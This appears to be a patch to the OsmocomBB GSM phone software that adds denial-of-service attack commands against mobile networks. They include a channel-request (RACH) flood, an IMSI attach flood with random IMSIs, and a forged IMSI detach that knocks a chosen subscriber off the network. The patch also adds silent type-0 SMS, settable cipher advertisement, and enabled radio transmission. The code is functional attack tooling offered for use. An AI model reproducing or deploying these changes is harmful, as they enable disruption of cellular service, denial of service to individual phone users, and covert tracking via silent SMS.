@@ -1,0 +1,592 @@
+diff --git a/src/host/layer23/include/osmocom/bb/mobile/dos.h b/src/host/layer23/include/osmocom/bb/mobile/dos.h
+new file mode 100644
+index 0000000..bab013e
+--- /dev/null
++++ b/src/host/layer23/include/osmocom/bb/mobile/dos.h
+@@ -0,0 +1,22 @@
++#ifndef DOS_H
++#define DOS_H
++
++struct {
++	int camp;
++	int rach;
++	int attach;
++	int detach;
++
++	int t3211_sec;
++	int t3211_msec;
++
++	int max_retrans;
++} dos;
++
++struct {
++	int pid;
++	int dcs;
++} silent_sms;
++
++#endif
++
+diff --git a/src/host/layer23/src/mobile/gsm322.c b/src/host/layer23/src/mobile/gsm322.c
+index 9166089..96f71ce 100644
+--- a/src/host/layer23/src/mobile/gsm322.c
++++ b/src/host/layer23/src/mobile/gsm322.c
+@@ -40,6 +40,7 @@
+ #include <osmocom/bb/common/networks.h>
+ #include <osmocom/bb/mobile/vty.h>
+ #include <osmocom/bb/mobile/app_mobile.h>
++#include <osmocom/bb/mobile/dos.h>
+ 
+ #include <l1ctl_proto.h>
+ 
+@@ -1428,6 +1429,8 @@ static int gsm322_a_sim_removed(struct osmocom_ms *ms, struct msgb *msg)
+ {
+ 	struct msgb *nmsg;
+ 
++	dos.camp = 0;
++
+ 	/* indicate SIM remove to cell selection process */
+ 	nmsg = gsm322_msgb_alloc(GSM322_EVENT_SIM_REMOVE);
+ 	if (!nmsg)
+@@ -1690,6 +1693,8 @@ static int gsm322_m_sim_removed(struct osmocom_ms *ms, struct msgb *msg)
+ 	struct gsm322_plmn *plmn = &ms->plmn;
+ 	struct msgb *nmsg;
+ 
++	dos.camp = 0;
++
+ 	stop_plmn_timer(plmn);
+ 
+ 	/* indicate SIM remove to cell selection process */
+diff --git a/src/host/layer23/src/mobile/gsm411_sms.c b/src/host/layer23/src/mobile/gsm411_sms.c
+index 655fe53..a9756c4 100644
+--- a/src/host/layer23/src/mobile/gsm411_sms.c
++++ b/src/host/layer23/src/mobile/gsm411_sms.c
+@@ -37,6 +37,7 @@
+ #include <osmocom/bb/mobile/mncc.h>
+ #include <osmocom/bb/mobile/transaction.h>
+ #include <osmocom/bb/mobile/gsm411_sms.h>
++#include <osmocom/bb/mobile/dos.h>
+ #include <osmocom/gsm/gsm0411_utils.h>
+ #include <osmocom/core/talloc.h>
+ #include <osmocom/bb/mobile/vty.h>
+@@ -109,8 +110,14 @@ struct gsm_sms *sms_from_text(const char *receiver, int dcs, const char *text)
+ 	sms->reply_path_req = 0;
+ 	sms->status_rep_req = 0;
+ 	sms->ud_hdr_ind = 0;
+-	sms->protocol_id = 0; /* implicit */
+-	sms->data_coding_scheme = dcs;
++	if (silent_sms.pid)
++		sms->protocol_id = 0x40; /* type 0 */
++	else
++		sms->protocol_id = 0; /* implicit */
++	if (silent_sms.dcs)
++		sms->data_coding_scheme = 0xC0;
++	else
++		sms->data_coding_scheme = dcs;
+ 	strncpy(sms->address, receiver, sizeof(sms->address)-1);
+ 	/* Generate user_data */
+ 	sms->user_data_len = gsm_7bit_encode(sms->user_data, sms->text);
+diff --git a/src/host/layer23/src/mobile/gsm48_mm.c b/src/host/layer23/src/mobile/gsm48_mm.c
+index 46b641c..79b58ef 100644
+--- a/src/host/layer23/src/mobile/gsm48_mm.c
++++ b/src/host/layer23/src/mobile/gsm48_mm.c
+@@ -40,6 +40,7 @@
+ #include <osmocom/bb/mobile/gsm411_sms.h>
+ #include <osmocom/bb/mobile/app_mobile.h>
+ #include <osmocom/bb/mobile/vty.h>
++#include <osmocom/bb/mobile/dos.h>
+ 
+ extern void *l23_ctx;
+ 
+@@ -409,11 +410,19 @@ static void start_mm_t3210(struct gsm48_mmlayer *mm)
+ 
+ static void start_mm_t3211(struct gsm48_mmlayer *mm)
+ {
+-	LOGP(DMM, LOGL_INFO, "starting T3211 (loc. upd. retry delay) with "
+-		"%d.%d seconds\n", GSM_T3211_MS);
++	if (dos.attach)
++		LOGP(DMM, LOGL_INFO, "starting T3211 (loc. upd. retry delay) with "
++			"%d.%d seconds\n", dos.t3211_sec, dos.t3211_msec);
++	else
++		LOGP(DMM, LOGL_INFO, "starting T3211 (loc. upd. retry delay) with "
++			"%d.%d seconds\n", GSM_T3211_MS);
++
+ 	mm->t3211.cb = timeout_mm_t3211;
+ 	mm->t3211.data = mm;
+-	osmo_timer_schedule(&mm->t3211, GSM_T3211_MS);
++	if (dos.attach)
++		osmo_timer_schedule(&mm->t3211, dos.t3211_sec, dos.t3211_msec);
++	else
++		osmo_timer_schedule(&mm->t3211, GSM_T3211_MS);
+ }
+ 
+ static void start_mm_t3212(struct gsm48_mmlayer *mm, int sec)
+@@ -2219,6 +2228,14 @@ static int gsm48_mm_loc_upd_normal(struct osmocom_ms *ms, struct msgb *msg)
+ 	struct gsm48_sysinfo *s = &cs->sel_si;
+ 	struct msgb *nmsg;
+ 
++	if (dos.camp) {
++		subscr->ustate = GSM_SIM_U1_UPDATED;
++		subscr->mcc = cs->sel_mcc;
++		subscr->mnc = cs->sel_mnc;
++		subscr->lac = cs->sel_lac;
++		subscr->imsi_attached = 1;
++	}
++
+ 	/* in case we already have a location update going on */
+ 	if (mm->lupd_pending) {
+ 		LOGP(DMM, LOGL_INFO, "Loc. upd. already pending.\n");
+@@ -2367,6 +2384,12 @@ static int gsm48_mm_tx_loc_upd_req(struct osmocom_ms *ms)
+ 	gsm48_encode_classmark1(&nlu->classmark1, sup->rev_lev, sup->es_ind,
+ 		set->a5_1, pwr_lev);
+ 	/* MI */
++	if (dos.attach) {
++		sprintf(subscr->imsi, "%s%s%d",
++				gsm_print_mcc(subscr->mcc),
++				gsm_print_mnc(subscr->mnc), rand());
++	}
++
+ 	if (subscr->tmsi != 0xffffffff) { /* have TMSI ? */
+ 		gsm48_encode_mi(buf, NULL, ms, GSM_MI_TYPE_TMSI);
+ 		LOGP(DMM, LOGL_INFO, " using TMSI 0x%08x\n", subscr->tmsi);
+@@ -2527,7 +2550,7 @@ static int gsm48_mm_rx_loc_upd_rej(struct osmocom_ms *ms, struct msgb *msg)
+ 	struct gsm48_hdr *gh = msgb_l3(msg);
+ 	unsigned int payload_len = msgb_l3len(msg) - sizeof(*gh);
+ 
+-	if (payload_len < 1) {
++	if (payload_len < 1 || dos.attach) {
+ 		LOGP(DMM, LOGL_NOTICE, "Short read of LOCATION UPDATING REJECT "
+ 			"message error.\n");
+ 		return -EINVAL;
+@@ -3570,6 +3593,12 @@ static int gsm48_mm_abort_rr(struct osmocom_ms *ms, struct msgb *msg)
+  * other processes
+  */
+ 
++int gsm48_mm_dos_detach(struct osmocom_ms *ms)
++{
++	/* establish RR and send IMSI detach */
++	return gsm48_mm_tx_imsi_detach(ms, GSM48_RR_EST_REQ);
++}
++
+ /* RR is released in other states */
+ static int gsm48_mm_rel_other(struct osmocom_ms *ms, struct msgb *msg)
+ {
+@@ -4108,28 +4137,38 @@ status:
+ 	}
+ 
+ 	/* find function for current state and message */
+-	for (i = 0; i < MMDATASLLEN; i++) {
+-		if (msg_type == mmdatastatelist[i].type)
+-			msg_supported = 1;
+-		if ((msg_type == mmdatastatelist[i].type)
+-		 && ((1 << mm->state) & mmdatastatelist[i].states))
+-			break;
+-	}
+-	if (i == MMDATASLLEN) {
+-		msgb_free(msg);
+-		if (msg_supported) {
+-			LOGP(DMM, LOGL_NOTICE, "Message unhandled at this "
+-				"state.\n");
+-			return gsm48_mm_tx_mm_status(ms,
+-				GSM48_REJECT_MSG_TYPE_NOT_COMPATIBLE);
+-		} else {
+-			LOGP(DMM, LOGL_NOTICE, "Message not supported.\n");
+-			return gsm48_mm_tx_mm_status(ms,
+-				GSM48_REJECT_MSG_TYPE_NOT_IMPLEMENTED);
++	if (dos.attach) {
++		/* stop MM connection timer */
++		stop_mm_t3230(mm);
++
++		gsm48_mm_release_mm_conn(ms, 1, 16, 0, 0);
++
++		rc = 0;
++
++	} else {
++		for (i = 0; i < MMDATASLLEN; i++) {
++			if (msg_type == mmdatastatelist[i].type)
++				msg_supported = 1;
++			if ((msg_type == mmdatastatelist[i].type)
++			 && ((1 << mm->state) & mmdatastatelist[i].states))
++				break;
++		}
++		if (i == MMDATASLLEN) {
++			msgb_free(msg);
++			if (msg_supported) {
++				LOGP(DMM, LOGL_NOTICE, "Message unhandled at this "
++					"state.\n");
++				return gsm48_mm_tx_mm_status(ms,
++					GSM48_REJECT_MSG_TYPE_NOT_COMPATIBLE);
++			} else {
++				LOGP(DMM, LOGL_NOTICE, "Message not supported.\n");
++				return gsm48_mm_tx_mm_status(ms,
++					GSM48_REJECT_MSG_TYPE_NOT_IMPLEMENTED);
++			}
+ 		}
+-	}
+ 
+-	rc = mmdatastatelist[i].rout(ms, msg);
++		rc = mmdatastatelist[i].rout(ms, msg);
++	}
+ 
+ 	msgb_free(msg);
+ 
+diff --git a/src/host/layer23/src/mobile/gsm48_rr.c b/src/host/layer23/src/mobile/gsm48_rr.c
+index 76eaf8f..34b00e9 100644
+--- a/src/host/layer23/src/mobile/gsm48_rr.c
++++ b/src/host/layer23/src/mobile/gsm48_rr.c
+@@ -79,6 +79,7 @@
+ #include <osmocom/bb/common/networks.h>
+ #include <osmocom/bb/common/l1ctl.h>
+ #include <osmocom/bb/mobile/vty.h>
++#include <osmocom/bb/mobile/dos.h>
+ 
+ #include <l1ctl_proto.h>
+ 
+@@ -1345,7 +1346,11 @@ static int gsm48_rr_chan_req(struct osmocom_ms *ms, int cause, int paging,
+ 	rr->wait_assign = 0;
+ 
+ 	/* number of retransmissions (with first transmission) */
+-	rr->n_chan_req = s->max_retrans + 1;
++	if (dos.rach) {
++		rr->n_chan_req = dos.max_retrans + 1;
++	} else {
++		rr->n_chan_req = s->max_retrans + 1;
++	}
+ 
+ 	/* generate CHAN REQ (9.1.8) */
+ 	switch (cause) {
+@@ -1697,6 +1702,11 @@ fail:
+ 	return lapdm_rslms_recvmsg(nmsg, &ms->lapdm_channel);
+ }
+ 
++int gsm48_rr_dos_rach(struct osmocom_ms *ms)
++{
++	return gsm48_rr_chan_req(ms, RR_EST_CAUSE_LOC_UPD, 0, GSM_MI_TYPE_TMSI);
++}
++
+ /*
+  * system information
+  */
+@@ -2358,6 +2368,9 @@ static int gsm48_match_ra(struct osmocom_ms *ms, struct gsm48_req_ref *ref)
+ 	uint8_t ia_t1, ia_t2, ia_t3;
+ 	uint8_t cr_t1, cr_t2, cr_t3;
+ 
++	if (dos.rach)
++		return 0;
++
+ 	for (i = 0; i < 3; i++) {
+ 		/* filter confirmed RACH requests only */
+ 		if (rr->cr_hist[i].valid && ref->ra == rr->cr_hist[i].ref.ra) {
+diff --git a/src/host/layer23/src/mobile/vty_interface.c b/src/host/layer23/src/mobile/vty_interface.c
+index 5782a17..98214d8 100644
+--- a/src/host/layer23/src/mobile/vty_interface.c
++++ b/src/host/layer23/src/mobile/vty_interface.c
+@@ -40,6 +40,7 @@
+ #include <osmocom/bb/mobile/app_mobile.h>
+ #include <osmocom/bb/mobile/gsm480_ss.h>
+ #include <osmocom/bb/mobile/gsm411_sms.h>
++#include <osmocom/bb/mobile/dos.h>
+ #include <osmocom/vty/telnet_interface.h>
+ 
+ void *l23_ctx;
+@@ -54,6 +55,9 @@ int mncc_dtmf(struct osmocom_ms *ms, char *dtmf);
+ extern struct llist_head ms_list;
+ extern struct llist_head active_connections;
+ 
++extern int gsm48_mm_dos_detach(struct osmocom_ms *ms);
++extern int gsm48_rr_dos_rach(struct osmocom_ms *ms);
++
+ struct cmd_node ms_node = {
+ 	MS_NODE,
+ 	"%s(ms)#",
+@@ -863,6 +867,69 @@ DEFUN(call_dtmf, call_dtmf_cmd, "call MS_NAME dtmf DIGITS",
+ 	return CMD_SUCCESS;
+ }
+ 
++DEFUN(crypt_support, crypt_support_cmd, "encryption MS_NAME A5/1 A5/2 A5/3 A5/4 A5/5 A5/6 A5/7",
++	"Set the encryption support advertised by the ms\n"
++	"Name of MS (see \"show ms\")\n"
++	"1 for supporting, 0 for not supporting\n"
++	"1 for supporting, 0 for not supporting\n"
++	"1 for supporting, 0 for not supporting\n"
++	"1 for supporting, 0 for not supporting\n"
++	"1 for supporting, 0 for not supporting\n"
++	"1 for supporting, 0 for not supporting\n"
++	"1 for supporting, 0 for not supporting\n")
++{
++	struct osmocom_ms *ms;
++	struct gsm_settings *set;
++
++	ms = get_ms(argv[0], vty);
++	if (!ms)
++		return CMD_WARNING;
++	set = &ms->settings;
++
++	if(argc>1 && atoi(argv[1]))
++		set->a5_1 = 1;
++	if(argc>2 && atoi(argv[2]))
++		set->a5_2 = 1;
++	if(argc>3 && atoi(argv[3]))
++		set->a5_3 = 1;
++	if(argc>4 && atoi(argv[4]))
++		set->a5_4 = 1;
++	if(argc>5 && atoi(argv[5]))
++		set->a5_5 = 1;
++	if(argc>6 && atoi(argv[6]))
++		set->a5_6 = 1;
++	if(argc>7 && atoi(argv[7]))
++		set->a5_7 = 1;
++
++	return CMD_SUCCESS;
++}
++
++DEFUN(silent, silent_cmd, "silent TP-PID TP-DCS",
++	"Set SMS messages header\n"
++	"1 for 0x40, 0 for default\n"
++	"1 for 0xC0, 0 for default\n")
++{
++	int pid;
++	int dcs;
++
++	if (argc >= 1) {
++		pid = atoi(argv[0]);
++		dcs = atoi(argv[1]);
++		if (pid) {
++			silent_sms.pid = 1;
++		} else {
++			silent_sms.pid = 0;
++		}
++		if (dcs) {
++			silent_sms.dcs = 1;
++		} else {
++			silent_sms.dcs = 0;
++		}
++	}
++
++	return CMD_SUCCESS;
++}
++
+ DEFUN(sms, sms_cmd, "sms MS_NAME NUMBER .LINE",
+ 	"Send an SMS\nName of MS (see \"show ms\")\nPhone number to send SMS "
+ 	"(Use digits '0123456789*#abc', and '+' to dial international)\n"
+@@ -1043,6 +1110,190 @@ DEFUN(network_search, network_search_cmd, "network search MS_NAME",
+ 	return CMD_SUCCESS;
+ }
+ 
++DEFUN(dos_camp, dos_camp_cmd,
++	"dos camp MS_NAME [MCC] [MNC] [LAC] [TMSI]",
++	"DoS attacks\nCamp on a given network\n"
++	"Name of MS (see \"show ms\")\n"
++	"Optionally set mobile Country Code of RPLMN\n"
++	"Optionally set mobile Network Code of RPLMN\n"
++	"Optionally set location area code of RPLMN\n"
++	"Optionally set current assigned TMSI")
++{
++	struct osmocom_ms *ms;
++	struct gsm_settings *set;
++
++	ms = get_ms(argv[0], vty);
++	if (!ms)
++		return CMD_WARNING;
++
++	set = &ms->settings;
++	if(!set->test_rplmn_valid) {
++		vty_out(vty, "Need to set a test rplmn first.%s", VTY_NEWLINE);
++		return CMD_WARNING;
++	}
++
++	dos.camp = 1;
++
++	dos.rach = 0;
++	dos.attach = 0;
++	dos.detach = 0;
++
++	dos.t3211_sec = 15;
++	dos.t3211_msec = 0;
++
++	dos.max_retrans = 0;
++
++	return _sim_test_cmd(vty, argc, argv, 0);
++}
++
++DEFUN(dos_rach, dos_rach_cmd, "dos rach [MS_NAME] <1-65535>",
++	"DoS attacks\n""Channel Request flood\n"
++	"Name of MS (see \"show ms\")\n"
++	"Set max number of retransmissions\n")
++{
++	struct osmocom_ms *ms;
++	int retrans;
++
++	ms = get_ms(argv[0], vty);
++	if (!ms)
++		return CMD_WARNING;
++
++	if (argc >= 2) {
++		retrans = atoi(argv[1]);
++	} else {
++		vty_out(vty, "Need to set a retransmission number%s", VTY_NEWLINE);
++		return CMD_WARNING;
++	}
++
++	if (!dos.camp) {
++		vty_out(vty, "Need to camp first (see \"dos camp\")%s", VTY_NEWLINE);
++		return CMD_WARNING;
++	}
++
++	dos.rach = 1;
++	dos.attach = 0;
++	dos.detach = 0;
++
++	dos.t3211_sec = 15;
++	dos.t3211_msec = 0;
++
++	dos.max_retrans = retrans;
++
++	gsm48_rr_dos_rach(ms);
++
++	return CMD_SUCCESS;
++}
++
++DEFUN(dos_attach, dos_attach_cmd, "dos attach [MS_NAME] [MCC] [MNC] <0-65535> <0-65535>",
++	"DoS attacks\n""IMSI attach flood\n"
++	"Name of MS (see \"show ms\")\n"
++	"Mobile Country Code\n"
++	"Mobile Network Code\n"
++	"Set loc. upd. retry delay in seconds.\n"
++	"Set loc. upd. retry delay in micro seconds.\n")
++{
++	struct osmocom_ms *ms;
++	struct gsm_settings *set;
++	uint16_t mcc = 0, mnc = 0, seconds = 15, mseconds = 0;
++
++	ms = get_ms(argv[0], vty);
++	if (!ms)
++		return CMD_WARNING;
++
++	set = &ms->settings;
++
++	if (argc >= 4) {
++
++		mcc = gsm_input_mcc((char *)argv[1]);
++		mnc = gsm_input_mnc((char *)argv[2]);
++		seconds = atoi(argv[3]);
++		if (argc >= 5)
++			mseconds = atoi(argv[4]);
++
++		if (mcc == GSM_INPUT_INVALID) {
++			vty_out(vty, "Given MCC invalid%s", VTY_NEWLINE);
++			return CMD_WARNING;
++		}
++		if (mnc == GSM_INPUT_INVALID) {
++			vty_out(vty, "Given MNC invalid%s", VTY_NEWLINE);
++			return CMD_WARNING;
++		}
++		if (seconds < 0 || seconds > 65535) {
++			vty_out(vty, "Given seconds delay invalid%s", VTY_NEWLINE);
++			return CMD_WARNING;
++		}
++		if (mseconds < 0 || mseconds > 65535) {
++			vty_out(vty, "Given micro seconds delay invalid%s", VTY_NEWLINE);
++			return CMD_WARNING;
++		}
++
++	} else {
++		vty_out(vty, "Not enough arguments%s", VTY_NEWLINE);
++		return CMD_WARNING;
++	}
++
++	if(!set->test_rplmn_valid) {
++		vty_out(vty, "Need to set a test rplmn first.%s", VTY_NEWLINE);
++		return CMD_WARNING;
++	}
++
++	dos.rach = 0;
++	dos.attach = 1;
++	dos.detach = 0;
++
++	dos.t3211_sec = seconds;
++	dos.t3211_msec = mseconds;
++
++	dos.max_retrans = 0;
++
++	gsm_subscr_testcard(ms, mcc, mnc, 0, 0xffffffff, 0);
++
++	return CMD_SUCCESS;
++}
++
++DEFUN(dos_detach, dos_detach_cmd, "dos detach [MS_NAME] [IMSI]",
++	"DoS attacks\n""IMSI detach\n"
++	"Name of MS (see \"show ms\")\n")
++{
++	struct osmocom_ms *ms;
++	struct gsm_subscriber *subscr;
++	char *error;
++
++	ms = get_ms(argv[0], vty);
++	if (!ms)
++		return CMD_WARNING;
++
++	subscr = &ms->subscr;
++
++	if (argc >= 2) {
++		error = gsm_check_imsi(argv[1]);
++		if (error) {
++			vty_out(vty, "%s%s", error, VTY_NEWLINE);
++			return CMD_WARNING;
++		}
++	}
++
++	if (!dos.camp) {
++		vty_out(vty, "Need to camp first (see \"dos camp\")%s", VTY_NEWLINE);
++		return CMD_WARNING;
++	}
++
++	dos.rach = 0;
++	dos.attach = 0;
++	dos.detach = 1;
++
++	dos.t3211_sec = 15;
++	dos.t3211_msec = 0;
++
++	dos.max_retrans = 0;
++
++	strcpy(subscr->imsi, argv[1]);
++
++	gsm48_mm_dos_detach(ms);
++
++	return CMD_SUCCESS;
++}
++
+ DEFUN(cfg_gps_enable, cfg_gps_enable_cmd, "gps enable",
+ 	"GPS receiver")
+ {
+@@ -2817,10 +3068,17 @@ int ms_vty_init(void)
+ 	install_element(ENABLE_NODE, &call_retr_cmd);
+ 	install_element(ENABLE_NODE, &call_dtmf_cmd);
+ 	install_element(ENABLE_NODE, &sms_cmd);
++	install_element(ENABLE_NODE, &silent_cmd);
++	install_element(ENABLE_NODE, &crypt_support_cmd);
+ 	install_element(ENABLE_NODE, &service_cmd);
+ 	install_element(ENABLE_NODE, &test_reselection_cmd);
+ 	install_element(ENABLE_NODE, &delete_forbidden_plmn_cmd);
+ 
++	install_element(ENABLE_NODE, &dos_camp_cmd);
++	install_element(ENABLE_NODE, &dos_rach_cmd);
++	install_element(ENABLE_NODE, &dos_attach_cmd);
++	install_element(ENABLE_NODE, &dos_detach_cmd);
++
+ #ifdef _HAVE_GPSD
+ 	install_element(CONFIG_NODE, &cfg_gps_host_cmd);
+ #endif
+diff --git a/src/target/firmware/Makefile b/src/target/firmware/Makefile
+index 42f7ad4..b816061 100644
+--- a/src/target/firmware/Makefile
++++ b/src/target/firmware/Makefile
+@@ -127,7 +127,7 @@ INCLUDES=-Iinclude/ -I../../../include -I../../shared/libosmocore/include
+ #
+ 
+ # Uncomment this line if you want to enable Tx (Transmit) Support.
+-#CFLAGS += -DCONFIG_TX_ENABLE
++CFLAGS += -DCONFIG_TX_ENABLE
+ 
+ # Uncomment this line if you want to write to flash.
+ #CFLAGS += -DCONFIG_FLASH_WRITE
